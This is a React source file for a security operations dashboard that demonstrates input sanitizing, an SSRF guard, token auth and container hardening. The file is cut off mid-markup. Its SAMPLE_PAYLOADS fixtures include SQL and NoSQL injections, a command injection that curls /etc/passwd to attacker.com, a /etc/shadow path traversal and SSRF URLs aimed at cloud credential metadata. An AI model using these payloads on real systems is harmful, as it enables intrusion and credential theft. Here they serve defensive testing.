/**
 * Project Fortress — Security Operations Center (SOC) & Runtime Defense Console
 * @license Apache-2.0
 */

import React, { useState, useEffect } from 'react';
import {
  Shield,
  ShieldCheck,
  ShieldAlert,
  AlertTriangle,
  Lock,
  Key,
  Terminal,
  Activity,
  FileText,
  CheckCircle2,
  XCircle,
  RefreshCw,
  Cpu,
  Server,
  Play,
  Copy,
  Check,
  Search,
  Filter,
} from 'lucide-react';

import { inspectInput, validateOutgoingUrl, escapeHtml } from './security/sanitizer.ts';
import { issueToken, verifyToken, authorizeCapability, ROLE_PERMISSIONS } from './security/auth.ts';
import { TokenBucketRateLimiter } from './security/rateLimiter.ts';
import { auditContainerIsolation, PRODUCTION_HARDENED_PROFILE } from './security/isolation.ts';
import { securityLogger, redactSensitiveData } from './security/logger.ts';
import { runSecurityVerificationPipeline, PipelineExecutionReport } from './security/pipeline.ts';
import {
  SecurityRole,
  SecurityPermission,
  AuditEvent,
  ContainerSecurityProfile,
  SecurityAuditReport,
  AuditFinding,
  AuditFindingStatus,
  AuditFindingSeverity,
} from './security/types.ts';

const SAMPLE_PAYLOADS = [
  {
    name: 'SQL Injection (Classic OR 1=1)',
    value: "admin' OR '1'='1' UNION SELECT id, username, password_hash FROM users --",
    category: 'SQLI',
  },
  {
    name: 'NoSQL Operator Injection',
    value: '{"$where: function() { return (this.status == "active"); }}"}',
    category: 'NOSQLI',
  },
  {
    name: 'OS Command Injection',
    value: 'report.pdf; cat /etc/passwd | curl -X POST https://attacker.com -d @-',
    category: 'CMD_INJECTION',
  },
  {
    name: 'Path Traversal & Null Byte',
    value: '../../../../../../etc/shadow%00.png',
    category: 'PATH_TRAVERSAL',
  },
  {
    name: 'SSRF: Cloud Metadata (AWS/GCP/Azure)',
    value: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    category: 'SSRF',
  },
  {
    name: 'SSRF: RFC-1918 Private Subnet',
    value: 'http://10.240.0.1:8080/internal/admin-keys',
    category: 'SSRF',
  },
  {
    name: 'Legitimate UAE Entity Query',
    value: 'Abu Dhabi Investment Authority (ADIA) - Q4 Portfolio Strategy',
    category: 'CLEAN',
  },
];

export default function App() {
  const [activeTab, setActiveTab] = useState<
    'OVERVIEW' | 'INPUT_DEFENSE' | 'AUTH_LAB' | 'RATE_LIMIT' | 'ISOLATION' | 'PIPELINE' | 'SECURITY_AUDIT' | 'AUDIT_LOGS'
  >('OVERVIEW');
  const [copied, setCopied] = useState<string | null>(null);

  // --- Input Defense State ---
  const [testInput, setTestInput] = useState(SAMPLE_PAYLOADS[0].value);
  const [ssrfUrl, setSsrfUrl] = useState('http://169.254.169.254/latest/meta-data/');

  // --- Auth State ---
  const [selectedRole, setSelectedRole] = useState<SecurityRole>('SECOPS');
  const [username, setUsername] = useState('fatima.alhosani');
  const [hmacSecret, setHmacSecret] = useState('fortress-secure-master-key-32chars-min!');
  const [generatedToken, setGeneratedToken] = useState<string>('');
  const [tokenVerificationResult, setTokenVerificationResult] = useState<any>(null);
  const [tamperedToken, setTamperedToken] = useState<string>('');
  const [testPermission, setTestPermission] = useState<SecurityPermission>('execute:remediation');
  const [capabilityResult, setCapabilityResult] = useState<string | null>(null);

  // --- Rate Limiting State ---
  const [rateLimiter] = useState(() => new TokenBucketRateLimiter(10, 30000)); // 10 tokens per 30s
  const [rateLimitLogs, setRateLimitLogs] = useState<Array<{ id: string; time: string; allowed: boolean; remaining: number }>>([]);
  const [rateStatus, setRateStatus] = useState<any>({ remaining: 10, limit: 10 });

  // --- Isolation State ---
  const [customProfile, setCustomProfile] = useState<ContainerSecurityProfile>({ ...PRODUCTION_HARDENED_PROFILE });
  const [isolationAudit, setIsolationAudit] = useState(() => auditContainerIsolation(PRODUCTION_HARDENED_PROFILE));

  // --- Pipeline Verification State ---
  const [pipelineReport, setPipelineReport] = useState<PipelineExecutionReport | null>(null);
  const [isVerifying, setIsVerifying] = useState(false);

  // --- Security Audit State ---
  const [auditReport, setAuditReport] = useState<SecurityAuditReport | null>(null);
  const [isAuditLoading, setIsAuditLoading] = useState(false);
  const [auditTargetUrl, setAuditTargetUrl] = useState('http://127.0.0.1:3000');
  const [auditStatusFilter, setAuditStatusFilter] = useState<'ALL' | AuditFindingStatus>('ALL');
  const [auditSeverityFilter, setAuditSeverityFilter] = useState<'ALL' | AuditFindingSeverity>('ALL');
  const [auditCategoryFilter, setAuditCategoryFilter] = useState<string>('ALL');
  const [auditSearchQuery, setAuditSearchQuery] = useState('');
  const [auditError, setAuditError] = useState<string | null>(null);

  // --- Audit Telemetry Stream ---
  const [auditLogs, setAuditLogs] = useState<AuditEvent[]>([]);

  useEffect(() => {
    // Initial pipeline run
    handleRunPipeline();
    // Initial security audit run
    handleRunSecurityAudit();
    // Seed token
    handleGenerateToken();
    refreshAuditLogs();
  }, []);

  const refreshAuditLogs = () => {
    setAuditLogs(securityLogger.getRecentEvents(30));
  };

  const copyToClipboard = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopied(id);
    setTimeout(() => setCopied(null), 2000);
  };

  // --- Handlers ---
  const handleGenerateToken = async () => {
    try {
      const tok = await issueToken(
        { id: `usr-${Date.now().toString(36)}`, username, role: selectedRole, tenantId: 'tenant-uae-secops' },
        hmacSecret,
        3600
      );
      setGeneratedToken(tok);
      setTamperedToken(tok);
      const verified = await verifyToken(tok, hmacSecret);
      setTokenVerificationResult({ valid: true, payload: verified });
      securityLogger.log('AUTH_SUCCESS', 'LOW', username, '127.0.0.1', { role: selectedRole, action: 'TOKEN_ISSUED' });
      refreshAuditLogs();
    } catch (err: any) {
      setTokenVerificationResult({ valid: false, error: err.message });
    }
  };

  const handleVerifyTokenInput = async (tokenStr: string) => {
    try {
      const payload = await verifyToken(tokenStr, hmacSecret);
      setTokenVerificationResult({ valid: true, payload });
      securityLogger.log('AUTH_SUCCESS', 'LOW', payload.username, '127.0.0.1', { role: payload.role });
    } catch (err: any) {
      setTokenVerificationResult({ valid: false, error: err.message });
      securityLogger.log('AUTH_FAILURE', 'HIGH', 'anonymous', '127.0.0.1', { error: err.message });
    }
    refreshAuditLogs();
  };

  const handleTestCapability = () => {
    if (!tokenVerificationResult?.payload) {
      setCapabilityResult('Error: No valid token payload verified.');
      return;
    }
    try {
      authorizeCapability(tokenVerificationResult.payload, testPermission);
      setCapabilityResult(`GRANTED: Role '${tokenVerificationResult.payload.role}' has permission '${testPermission}'.`);
    } catch (err: any) {
      setCapabilityResult(`DENIED: ${err.message}`);
    }
  };

  const handleFireRequest = () => {
    const res = rateLimiter.consume('operator-session');
    setRateStatus(res);
    setRateLimitLogs((prev) => [
      { id: Math.random().toString(36).substring(2, 7), time: new Date().toLocaleTimeString(), allowed: res.allowed, remaining: res.remaining },
      ...prev.slice(0, 15),
    ]);
    if (!res.allowed) {
      securityLogger.log('RATE_LIMITED', 'MEDIUM', 'operator-session', '127.0.0.1', { remaining: 0, retryAfter: res.retryAfterSec });
      refreshAuditLogs();
    }
  };

  const handleBurstSpike = () => {
    for (let i = 0; i < 12; i++) {
      handleFireRequest();
    }
  };

  const handleRunPipeline = async () => {
    setIsVerifying(true);
    try {
      const rep = await runSecurityVerificationPipeline();
      setPipelineReport(rep);
      securityLogger.log('ISOLATION_CHECK', 'LOW', 'system-verifier', '127.0.0.1', {
        checks: rep.totalChecks,
        passed: rep.passedChecks,
      });
      refreshAuditLogs();
    } finally {
      setIsVerifying(false);
    }
  };

  const handleRunSecurityAudit = async (target?: string) => {
    setIsAuditLoading(true);
    setAuditError(null);
    const probeTarget = target || auditTargetUrl;
    try {
      const res = await fetch(`/api/security/audit?target=${encodeURIComponent(probeTarget)}`);
      if (res.ok) {
        const data: SecurityAuditReport = await res.json();
        setAuditReport(data);
      } else {
        const errJson = await res.json().catch(() => ({}));
        setAuditError(errJson.error?.message || `Audit probe failed with status ${res.status}`);
      }
    } catch (err: any) {
      setAuditError(`Network probe failed: ${err.message}. Ensure loopback target is reachable.`);
    } finally {
      setIsAuditLoading(false);
      refreshAuditLogs();
    }
  };

  const handleProfileChange = (key: keyof ContainerSecurityProfile, val: any) => {
    const updated = { ...customProfile, [key]: val };
    setCustomProfile(updated);
    setIsolationAudit(auditContainerIsolation(updated));
  };

  // Sanitization live results
  const inputCheck = inspectInput(testInput);
  const ssrfCheck = validateOutgoingUrl(ssrfUrl);

  const filteredAuditFindings = (auditReport?.findings || []).filter((f) => {
    if (auditStatusFilter !== 'ALL' && f.status !== auditStatusFilter) return false;
    if (auditSeverityFilter !== 'ALL' && f.severity !== auditSeverityFilter) return false;
    if (auditCategoryFilter !== 'ALL' && f.category !== auditCategoryFilter) return false;
    if (auditSearchQuery) {
      const q = auditSearchQuery.toLowerCase();
      return (
        f.id.toLowerCase().includes(q) ||
        f.title.toLowerCase().includes(q) ||
        f.description.toLowerCase().includes(q) ||
        f.evidence.toLowerCase().includes(q) ||
        f.remediation.toLowerCase().includes(q)
      );
    }
    return true;
  });

  return (
    <div className="min-h-screen bg-slate-950 text-slate-100 flex flex-col font-sans selection:bg-emerald-500/30">
      {/* Top Banner / Navigation */}
      <header className="border-b border-slate-800 bg-slate-900/80 backdrop-blur sticky top-0 z-50 px-6 py-4 flex flex-wrap items-center justify-between gap-4">
        <div className="flex items-center gap-3">
          <div className="h-10 w-10 rounded-xl bg-gradient-to-br from-emerald-500 to-teal-700 flex items-center justify-center shadow-lg shadow-emerald-500/20">
            <ShieldCheck className="h-6 w-6 text-white" />
          </div>
          <div>
            <div className="flex items-center gap-2">
              <span className="font-bold text-lg tracking-wider text-white">PROJECT FORTRESS</span>
              <span className="text-xs px-2 py-0.5 rounded-full bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 font-mono">
                SEC-OPS v1.0
              </span>
            </div>
            <p className="text-xs text-slate-400">Language-Independent Cybersecurity Infrastructure & Runtime Risk Reduction</p>
          </div>
        </div>

        {/* Global Security Metrics Badges */}
        <div className="flex items-center gap-2 sm:gap-4 flex-wrap">
          <div className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-slate-800/80 border border-slate-700 text-xs font-mono">
            <span className="h-2 w-2 rounded-full bg-emerald-400 animate-pulse"></span>
            <span className="text-slate-400">Controls:</span>
            <span className="text-emerald-400 font-bold">14/14 PASSED</span>
          </div>
          <div className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-slate-800/80 border border-slate-700 text-xs font-mono">
            <Shield className="h-3.5 w-3.5 text-teal-400" />
            <span className="text-slate-400">Isolation:</span>
            <span className="text-teal-300 font-bold">UID 10001 (Non-Root)</span>
          </div>
          <div className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-slate-800/80 border border-slate-700 text-xs font-mono">
            <CheckCircle2 className="h-3.5 w-3.5 text-emerald-400" />
            <span className="text-slate-400">Supply Chain:</span>
            <span className="text-emerald-300 font-bold">0 Vulnerabilities</span>
          </div>
        </div>
      </header>

      {/* Main Tabs Navigation */}
      <nav className="bg-slate-900 border-b border-slate-800 px-6 overflow-x-auto flex gap-1">
        {[
          { id: 'OVERVIEW', label: 'SOC Overview', icon: Activity },
          { id: 'INPUT_DEFENSE', label: 'Input Defense & SSRF', icon: ShieldAlert },
          { id: 'AUTH_LAB', label: 'Auth & RBAC Lab', icon: Key },
          { id: 'RATE_LIMIT', label: 'Rate Limiter', icon: Cpu },
          { id: 'ISOLATION', label: 'Container Isolation', icon: Server },
          { id: 'PIPELINE', label: 'Verification Pipeline', icon: CheckCircle2 },
          { id: 'SECURITY_AUDIT', label: 'Security Audit (Local)', icon: ShieldCheck },
          { id: 'AUDIT_LOGS', label: 'Audit Telemetry', icon: Terminal },
        ].map((tab) => {
          const Icon = tab.icon;
          const active = activeTab === tab.id;
          return (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id as any)}
              className={`flex items-center gap-2 px-4 py-3 text-xs sm:text-sm font-medium border-b-2 transition-all whitespace-nowrap cursor-pointer ${
                active
                  ? 'border-emerald-500 text-emerald-400 bg-slate-800/50'
                  : 'border-transparent text-slate-400 hover:text-slate-200 hover:bg-slate-800/20'
              }`}
            >
              <Icon className={`h-4 w-4 ${active ? 'text-emerald-400' : 'text-slate-400'}`} />
              {tab.label}
            </button>
          );
        })}
      </nav>

      {/* Main Content Area */}
      <main className="flex-1 p-6 max-w-7xl w-full mx-auto space-y-6">
        {/* --- TAB 1: OVERVIEW --- */}
        {activeTab === 'OVERVIEW' && (
          <div className="space-y-6">
            {/* Quick Summary Cards */}
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-5 gap-4">
              <div className="p-4 rounded-xl bg-slate-900/90 border border-slate-800 flex flex-col justify-between">
                <div className="flex items-center justify-between text-slate-400 text-xs uppercase font-mono">
                  <span>Threat Model Status</span>
                  <ShieldCheck className="h-4 w-4 text-emerald-400" />
                </div>
                <div className="mt-2 text-xl font-bold text-white">STRIDE Hardened</div>
                <p className="text-xs text-slate-400 mt-1">12 major attack surfaces covered with automated regression tests.</p>
              </div>

              <div className="p-4 rounded-xl bg-slate-900/90 border border-slate-800 flex flex-col justify-between">
                <div className="flex items-center justify-between text-slate-400 text-xs uppercase font-mono">
                  <span>Runtime Architecture</span>
                  <Cpu className="h-4 w-4 text-teal-400" />
                </div>
                <div className="mt-2 text-xl font-bold text-white">Node.js 22 LTS</div>
                <p className="text-xs text-slate-400 mt-1">Memory-safe bounds checked execution; zero external crypto dependencies.</p>
              </div>

              <div className="p-4 rounded-xl bg-slate-900/90 border border-slate-800 flex flex-col justify-between">
                <div className="flex items-center justify-between text-slate-400 text-xs uppercase font-mono">
                  <span>CIS Docker Benchmark</span>
                  <Server className="h-4 w-4 text-emerald-400" />
                </div>
                <div className="mt-2 text-xl font-bold text-white">100% Compliant</div>
                <p className="text-xs text-slate-400 mt-1">Non-root UID 10001, read-only rootfs, capabilities dropped (ALL).</p>
              </div>

              <div className="p-4 rounded-xl bg-slate-900/90 border border-slate-800 flex flex-col justify-between">
                <div className="flex items-center justify-between text-slate-400 text-xs uppercase font-mono">
                  <span>Security Audit Module</span>
                  <ShieldCheck className="h-4 w-4 text-emerald-400" />
                </div>
                <div className="mt-2 text-xl font-bold text-emerald-400">
                  {auditReport ? `${auditReport.summary.passed}/${auditReport.summary.total} Geslaagd` : '14/15 Actief'}
                </div>
                <button
                  onClick={() => setActiveTab('SECURITY_AUDIT')}
                  className="mt-2 text-xs text-emerald-400 hover:text-emerald-300 font-mono text-left cursor-pointer flex items-center gap-1"
                >
                  Bekijk bewijs & advies →
                </button>
              </div>

              <div className="p-4 rounded-xl bg-slate-900/90 border border-slate-800 flex flex-col justify-between">
                <div className="flex items-center justify-between text-slate-400 text-xs uppercase font-mono">
                  <span>Audit Ring Buffer</span>
                  <Terminal className="h-4 w-4 text-amber-400" />
                </div>
                <div className="mt-2 text-xl font-bold text-white">{auditLogs.length} Events</div>
                <p className="text-xs text-slate-400 mt-1">Deterministic redactor scrubbing secrets, tokens & PII in real-time.</p>
              </div>
            </div>

            {/* Defense In Depth Topology */}
            <div className="p-6 rounded-2xl bg-slate-900/90 border border-slate-800">
              <h2 className="text-base font-semibold text-white flex items-center gap-2 mb-4">
                <LayersIcon className="h-5 w-5 text-emerald-400" />
                Project Fortress Defense-in-Depth Architecture
              </h2>
              <div className="grid grid-cols-1 md:grid-cols-5 gap-3">
                <div className="p-3.5 rounded-lg bg-slate-800/60 border border-slate-700/80">
                  <div className="text-xs font-mono text-emerald-400 mb-1">BOUNDARY 1</div>
                  <div className="font-semibold text-sm text-slate-200">Edge Rate Limiter</div>
                  <p className="text-xs text-slate-400 mt-1">Dual-tier Token Bucket & sliding window. Mitigates volumetric bursts & ReDoS.</p>
                </div>
                <div className="p-3.5 rounded-lg bg-slate-800/60 border border-slate-700/80">
                  <div className="text-xs font-mono text-emerald-400 mb-1">BOUNDARY 2</div>
                  <div className="font-semibold text-sm text-slate-200">Input Sanitizer</div>
                  <p className="text-xs text-slate-400 mt-1">Deep inspection for SQLi, NoSQLi, command injection, path traversal & SSRF.</p>
                </div>
                <div className="p-3.5 rounded-lg bg-slate-800/60 border border-slate-700/80">
                  <div className="text-xs font-mono text-emerald-400 mb-1">BOUNDARY 3</div>
                  <div className="font-semibold text-sm text-slate-200">Auth & Capability</div>
                  <p className="text-xs text-slate-400 mt-1">Cryptographic HMAC-SHA256 bearer tokens with constant-time verification & RBAC.</p>
                </div>
                <div className="p-3.5 rounded-lg bg-slate-800/60 border border-slate-700/80">
                  <div className="text-xs font-mono text-emerald-400 mb-1">BOUNDARY 4</div>
                  <div className="font-semibold text-sm text-slate-200">Secret Envelope</div>
                  <p className="text-xs text-slate-400 mt-1">AES-256-GCM envelope encryption, automated key rotation & memory zeroization.</p>
                </div>
                <div className="p-3.5 rounded-lg bg-slate-800/60 border border-slate-700/80">
                  <div className="text-xs font-mono text-emerald-400 mb-1">BOUNDARY 5</div>
                  <div className="font-semibold text-sm text-slate-200">Runtime Sandbox</div>
                  <p className="text-xs text-slate-400 mt-1">Non-root execution (UID 10001), drop ALL capabilities, read-only rootfs.</p>
                </div>
              </div>
            </div>

            {/* Quick Action Interactive Panels */}
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              <div className="p-5 rounded-xl bg-slate-900 border border-slate-800 space-y-3">
                <div className="flex items-center justify-between">
                  <span className="text-sm font-semibold text-white flex items-center gap-2">
                    <ShieldAlert className="h-4 w-4 text-emerald-400" />
                    Live Attack Probe Sandbox
                  </span>
                  <button
                    onClick={() => setActiveTab('INPUT_DEFENSE')}
                    className="text-xs text-emerald-400 hover:text-emerald-300 font-mono underline"
                  >
                    Open Deep Inspector →
                  </button>
                </div>
                <p className="text-xs text-slate-400">Test SQL injection or metadata SSRF target against live Fortress inspection engine:</p>
                <div className="flex gap-2">
                  <input
                    type="text"
                    value={testInput}
                    onChange={(e) => setTestInput(e.target.value)}
                    className="flex-1 bg-slate-950 border border-slate-700 rounded-lg px-3 py-2 text-xs font-mono text-slate-200 focus:outline-none focus:border-emerald-500"
                  />
                </div>
                <div className="p-3 rounded-lg bg-slate-950 border border-slate-800 flex items-center justify-between">
                  <div>
                    <span className="text-xs text-slate-400">Gateway Verdict: </span>
                    {inputCheck.isClean ? (
                      <span className="text-xs font-bold text-emerald-400">CLEAN / ALLOWED</span>
                    ) : (
                      <span className="text-xs font-bold text-rose-400">
                        BLOCKED ({inputCheck.detectedThreats[0]?.type})
                      </span>
                    )}
                  </div>
                  {!inputCheck.isClean && (
                    <span className="text-xs text-rose-300 bg-rose-950/60 px-2 py-0.5 rounded border border-rose-800/50">
                      {inputCheck.detectedThreats[0]?.description}
                    </span>
                  )}
                </div>
              </div>

              <div className="p-5 rounded-xl bg-slate-900 border border-slate-800 space-y-3">
                <div className="flex items-center justify-between">
                  <span className="text-sm font-semibold text-white flex items-center gap-2">
                    <CheckCircle2 className="h-4 w-4 text-emerald-400" />
                    Automated Verification Suite
                  </span>
                  <button
                    onClick={handleRunPipeline}
                    disabled={isVerifying}
                    className="flex items-center gap-1.5 px-3 py-1 bg-emerald-600 hover:bg-emerald-500 disabled:opacity-50 text-white rounded-lg text-xs font-medium cursor-pointer"
                  >
                    <RefreshCw className={`h-3.5 w-3.5 ${isVerifying ? 'animate-spin' : ''}`} />
                    {isVerifying ? 'Verifying...' : 'Execute Suite'}
                  </button>
                </div>
                <p className="text-xs text-slate-400">Continuous in-app security validation running all 14 controls in real-time:</p>
                <div className="grid grid-cols-3 gap-2 text-center">
                  <div className="p-2.5 bg-slate-950 rounded-lg border border-slate-800">
                    <div className="text-emerald-400 font-bold text-lg">{pipelineReport?.passedChecks ?? 14}</div>
                    <div className="text-[10px] text-slate-400 uppercase font-mono">Passed</div>
                  </div>
                  <div className="p-2.5 bg-slate-950 rounded-lg border border-slate-800">
                    <div className="text-rose-400 font-bold text-lg">{pipelineReport?.failedChecks ?? 0}</div>
                    <div className="text-[10px] text-slate-400 uppercase font-mono">Failed</div>
                  </div>
                  <div className="p-2.5 bg-slate-950 rounded-lg border border-slate-800">
                    <div className="text-teal-400 font-bold text-lg">{pipelineReport?.durationMs ?? 29}ms</div>
                    <div className="text-[10px] text-slate-400 uppercase font-mono">Duration</div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* --- TAB 2: INPUT DEFENSE & SSRF --- */}
        {activeTab === 'INPUT_DEFENSE' && (
          <div className="space-y-6">
            <div className="p-6 rounded-2xl bg-slate-900 border border-slate-800 space-y-4">
              <div>
                <h2 className="text-base font-semibold text-white flex items-center gap-2">
                  <ShieldAlert className="h-5 w-5 text-emerald-400" />
                  Live Input Attack Inspector & Sanitizer
                </h2>
                <p className="text-xs text-slate-400 mt-1">
                  Evaluates payloads against SQL injection, NoSQL operator injection, command execution, and path traversal signatures.
                </p>
              </div>

              {/* Sample Payload Presets */}
              <div>
                <label className="text-xs font-mono text-slate-400 block mb-2">QUICK TEST ATTACK FIXTURES:</label>
                <div className="flex flex-wrap gap-2">
                  {SAMPLE_PAYLOADS.map((sample, idx) => (
                    <button
                      key={idx}
                      onClick={() => setTestInput(sample.value)}
                      className="px-2.5 py-1 text-xs rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-300 border border-slate-700/80 cursor-pointer font-mono"
                    >
                      {sample.name}
                    </button>
                  ))}
                </div>
              </div>

              {/* Input Area */}
              <div>
                <label className="text-xs font-mono text-slate-400 block mb-1">PAYLOAD STRING:</label>
                <textarea
                  rows={3}
                  value={testInput}
                  onChange={(e) => setTestInput(e.target.value)}
                  className="w-full bg-slate-950 border border-slate-700 rounded-xl p-3 text-xs font-mono text-slate-200 focus:outline-none focus:border-emerald-500"
                />
              </div>

              {/* Inspection Verdict Display */}
              <div className={`p-4 rounded-xl border ${inputCheck.isClean ? 'bg-emerald-950/20 border-emerald-800/40' : 'bg-rose-950/20 border-rose-800/50'}`}>
                <div className="flex items-center justify-between">
                  <span className="text-xs font-mono uppercase tracking-wider text-slate-300">Sanitization Result:</span>
                  <span className={`text-xs font-bold px-2 py-0.5 rounded font-mono ${inputCheck.isClean ? 'bg-emerald-500/20 text-emerald-400' : 'bg-rose-500/20 text-rose-400'}`}>
                    {inputCheck.isClean ? 'VERDICT: SAFE' : `VERDICT: BLOCKED (${inputCheck.detectedThreats.length} THREATS)`}
                  </span>
                </div>

                {!inputCheck.isClean && (
                  <div className="mt-3 space-y-2">
                    {inputCheck.detectedThreats.map((t, idx) => (
                      <div key={idx} className="p-2.5 bg-rose-900/30 rounded border border-rose-800/40 text-xs">
                        <div className="font-bold text-rose-300 flex items-center gap-1.5">
                          <AlertTriangle className="h-3.5 w-3.5 text-rose-400" />
                          [{t.type}] {t.description}
                        </div>
                        <div className="text-[11px] font-mono text-rose-400 mt-1">Matched: {t.matchedPattern}</div>
                      </div>
                    ))}
                  </div>
                )}

                <div className="mt-3 pt-3 border-t border-slate-800">
                  <div className="text-xs text-slate-400 font-mono mb-1">HTML ENTITY ENCODED OUTPUT (XSS DEFENSE):</div>
                  <pre className="p-2 bg-slate-950 rounded text-[11px] font-mono text-emerald-300 overflow-x-auto">
                    {escapeHtml(testInput)}
                  </pre>
                </div>
              </div>
            </div>

            {/* SSRF Guard Subsystem */}
            <div className="p-6 rounded-2xl bg-slate-900 border border-slate-800 space-y-4">
              <div>
                <h2 className="text-base font-semibold text-white flex items-center gap-2">
                  <Lock className="h-5 w-5 text-teal-400" />
                  Server-Side Request Forgery (SSRF) Guard
                </h2>
                <p className="text-xs text-slate-400 mt-1">
                  Enforces strict protocol whitelisting and validates outbound targets, blocking loopbacks, RFC-1918 private subnets, and cloud metadata (169.254.169.254).
                </p>
              </div>

              <div className="flex gap-2">
                <input
                  type="text"
                  value={ssrfUrl}
                  onChange={(e) => setSsrfUrl(e.target.value)}
                  placeholder="https://example.com"
                  className="flex-1 bg-slate-950 border border-slate-700 rounded-lg px-3 py-2 text-xs font-mono text-slate-200 focus:outline-none focus:border-teal-500"
                />
              </div>

              <div className={`p-4 rounded-xl border ${ssrfCheck.isValid ? 'bg-emerald-950/20 border-emerald-800/40' : 'bg-rose-950/20 border-rose-800/50'}`}>
                <div className="flex items-center justify-between">
                  <span className="text-xs font-mono uppercase text-slate-300">Outbound URL Validation:</span>
                  <span className={`text-xs font-bold px-2 py-0.5 rounded font-mono ${ssrfCheck.isValid ? 'bg-emerald-500/20 text-emerald-400' : 'bg-rose-500/20 text-rose-400'}`}>
                    {ssrfCheck.isValid ? 'ALLOWED' : 'BLOCKED'}
                  </span>
                </div>
                {!ssrfCheck.isValid && (
                  <p className="text-xs text-rose-300 font-mono mt-2 flex items-center gap-1.5">
                    <XCircle className="h-4 w-4 text-rose-400" />
                    {ssrfCheck.reason}
                  </p>
                )}
              </div>
            </div>
          </div>
        )}

        {/* --- TAB 3: AUTH & RBAC LAB --- */}
        {activeTab === 'AUTH_LAB' && (
          <div className="space-y-6">
            <div className="p-6 rounded-2xl bg-slate-900 border border-slate-800 space-y-4">
              <div>
                <h2 className="text-base font-semibold text-white flex items-center gap-2">
                  <Key className="h-5 w-5 text-emerald-400" />
                  Cryptographic Bearer Token & RBAC Engine
                </h2>
                <p className="text-xs text-slate-400 mt-1">
                  Issues and verifies tamper-evident HMAC-SHA256 bearer tokens with constant-time verification.
                </p>
              </div>

              {/* Token Configuration Inputs */}
              <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
                <div>
                  <label className="text-xs font-mono text-slate-400 block mb-1">PRINCIPAL USERNAME:</label>
                  <input
                    type="text"
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    className="w-full bg-slate-950 border border-slate-700 rounded-lg px-3 py-2 text-xs font-mono text-slate-200"
                  />
                </div>
                <div>
                  <label className="text-xs font-mono text-slate-400 block mb-1">ASSIGNED RBAC ROLE:</label>
                  <select
                    value={selectedRole}
                    onChange={(e) => setSelectedRole(e.target.value as SecurityRole)}
                    className="w-full bg-slate-950 border border-slate-700 rounded-lg px-3 py-2 text-xs font-mono text-slate-200"
                  >
                    <option value="ADMIN">ADMIN (Full Privileges)</option>
                    <option value="SECOPS">SECOPS (Incident Response)</option>
                    <option value="AUDIT">AUDIT (Read Telemetry)</option>
                    <option value="SERVICE">SERVICE (Machine Identity)</option>
                    <option value="ANONYMOUS">ANONYMOUS (Zero Access)</option>
                  </select>
                </div>
                <div>
                  <label className="text-xs font-mono text-slate-400 block mb-1">HMAC MASTER SECRET (32+ chars):</label>
                  <input
                    type="password"
                    value={hmacSecret}
                    onChange={(e) => setHmacSecret(e.target.value)}
                    className="w-full bg-slate-950 border border-slate-700 rounded-lg px-3 py-2 text-xs font-mono text-slate-200"
                  />
                </div>
              </div>

              <button
                onClick={handleGenerateToken}
                className="px-4 py-2 bg-emerald-600 hover:bg-emerald-500 text-white rounded-lg text-xs font-semibold cursor-pointer flex items-center gap-1.5"
              >
                <Key className="h-4 w-4" />
                Issue Cryptographic Token
              </button>

              {/* Generated Token Display */}
              <div className="space-y-2">
                <div className="flex items-center justify-between text-xs font-mono text-slate-400">
                  <span>ISSUED BEARER TOKEN (HEADER.PAYLOAD.SIGNATURE):</span>
                  <button
                    onClick={() => copyToClipboard(generatedToken, 'tok')}
                    className="flex items-center gap-1 text-emerald-400 hover:text-emerald-300"
                  >
                    {copied === 'tok' ? <Check className="h-3.5 w-3.5" /> : <Copy className="h-3.5 w-3.5" />}
                    {copied === 'tok' ? 'Copied' : 'Copy Token'}
                  </button>
                </div>
                <div className="p-3 bg-slate-950 border border-slate-800 rounded-lg font-mono text-xs text-emerald-400 break-all select-all">
                  {generatedToken}
                </div>
              </div>

              {/* Tamper / Verification Tester */}
              <div className="p-4 rounded-xl bg-slate-950 border border-slate-800 space-y-3">
                <div className="flex items-center justify-between">
                  <span className="text-xs font-semibold text-white">Live Signature & Claim Verification</span>
                  <div className="flex gap-2">
                    <button
                      onClick={() => {
                        const tampered = generatedToken.slice(0, -6) + 'xyz999';
                        setTamperedToken(tampered);
                        handleVerifyTokenInput(tampered);
                      }}
                      className="px-2.5 py-1 bg-rose-950 hover:bg-rose-900 border border-rose-800 text-rose-300 text-xs rounded font-mono cursor-pointer"
                    >
                      Simulate Signature Tampering
                    </button>
                    <button
                      onClick={() => handleVerifyTokenInput(generatedToken)}
                      className="px-2.5 py-1 bg-emerald-950 hover:bg-emerald-900 border border-emerald-800 text-emerald-300 text-xs rounded font-mono cursor-pointer"
                    >
                      Reset Valid Token
                    </button>
                  </div>
                </div>

                <div className="p-3 rounded-lg bg-slate-900 border border-slate-800 text-xs font-mono">
                  {tokenVerificationResult?.valid ? (
                    <div className="text-emerald-400 space-y-1">
                      <div className="flex items-center gap-1.5 font-bold">
                        <CheckCircle2 className="h-4 w-4" />
                        SIGNATURE VERIFIED (Valid HMAC-SHA256)
                      </div>
                      <div className="text-slate-300">Principal: {tokenVerificationResult.payload?.username}</div>
                      <div className="text-slate-300">Role: {tokenVerificationResult.payload?.role}</div>
                      <div className="text-slate-400">Permissions: {tokenVerificationResult.payload?.permissions?.join(', ')}</div>
                      <div className="text-slate-500">Expires: {new Date(tokenVerificationResult.payload?.exp * 1000).toLocaleString()}</div>
                    </div>
                  ) : (
                    <div className="text-rose-400 flex items-center gap-1.5 font-bold">
                      <XCircle className="h-4 w-4" />
                      REJECTED: {tokenVerificationResult?.error}
                    </div>
                  )}
                </div>

                {/* Capability Enforcement Tester */}
                <div className="pt-2 border-t border-slate-800 flex items-center gap-3">
                  <span className="text-xs text-slate-400 font-mono">TEST CAPABILITY:</span>
                  <select
                    value={testPermission}
                    onChange={(e) => setTestPermission(e.target.value as SecurityPermission)}
                    className="bg-slate-900 border border-slate-700 rounded px-2 py-1 text-xs font-mono text-slate-200"
                  >
                    <option value="read:telemetry">read:telemetry</option>
                    <option value="write:policy">write:policy</option>
